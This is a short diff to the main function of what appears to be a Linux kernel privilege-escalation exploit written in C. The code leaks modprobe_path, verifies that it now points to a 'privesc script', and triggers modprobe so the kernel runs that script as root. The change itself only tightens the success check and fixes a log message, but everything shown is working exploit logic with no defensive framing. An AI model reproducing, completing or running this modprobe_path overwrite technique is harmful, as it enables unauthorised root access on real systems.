@@ -331,15 +331,18 @@ int main(void)
 	}
 
 	if (!success) {
-		printf("[-] unable to leak modprobe_path");
+		printf("[-] unable to leak modprobe_path\n");
 		goto end;
 	}
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
-	if (ret == EXIT_FAILURE)
+	if (ret == EXIT_FAILURE || strcmp(modprobe_path, privesc_script_path) != 0) {
+		printf("[-] modprobe_path (%s) differs from privesc script (%s)\n", modprobe_path,
+		       privesc_script_path);
 		goto end;
-	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
+	}
 
+	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
 	trigger_modprobe_sock();
 	ret = EXIT_SUCCESS;
 
